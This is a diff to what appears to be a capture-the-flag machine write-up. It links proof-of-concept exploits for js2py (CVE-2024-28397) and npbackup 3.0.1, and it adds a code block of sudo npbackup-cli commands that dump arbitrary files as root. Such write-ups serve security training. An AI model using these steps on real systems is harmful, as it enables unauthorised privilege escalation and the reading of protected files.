@@ -8,11 +8,9 @@
 
 A very easy and quick machine that can be pwned in two simple steps:
 
-1. **js2py 0.74** → [CVE-2024-28397](https://github.com/waleed-hassan569/CVE-2024-28397-command-execution-poc)  
-   *Thanks to @waleed-hassan569* → **USER.TXT**
+1. **js2py 0.74** → [CVE-2024-28397](https://github.com/waleed-hassan569/CVE-2024-28397-command-execution-poc) - *Thanks to @waleed-hassan569* → **USER.TXT**
 
-2. **npbackup 3.0.1** → [npbackup 3.0.1 PrivEsc](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation)  
-   *Thanks to @AliElKhatteb* → **ROOT.TXT**
+2. **npbackup 3.0.1** → [npbackup 3.0.1 PrivEsc](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation) - *Thanks to @AliElKhatteb* → **ROOT.TXT**
 
 ---
 
@@ -51,15 +49,16 @@ We run `sudo -l` and see that we have sudo access to **npbackup 3.0.1**.
 
 After a quick search, we find this [Privilege Escalation PoC.](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation)
 
-### PrivEscal with npbackup:
+### Privilege Escalation with npbackup:
 
-following the instruction, and we will get the **ROOT.TXT**
+Following the instructions, we can escalate to root and grab **ROOT.TXT**:
 
-`sudo /usr/local/bin/npbackup-cli -c npbackup.conf --backup` => creat backup
+```bash
+sudo /usr/local/bin/npbackup-cli -c npbackup.conf --backup  #Create a backup
+sudo /usr/local/bin/npbackup-cli -c npbackup.conf -s #List snapshot IDs
+sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump FILE --snapshot-id SNAP ID #Read file from backup
+```
 
-`sudo /usr/local/bin/npbackup-cli -c npbackup.conf -s` => list snap id
-
-`sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump FILE --snapshot-id SNAP ID` => read the file in backup
+This allows us to read any file from the backup, including sensitive ones.
 
 ![Icon](Images/npbackupexploit.png)
-
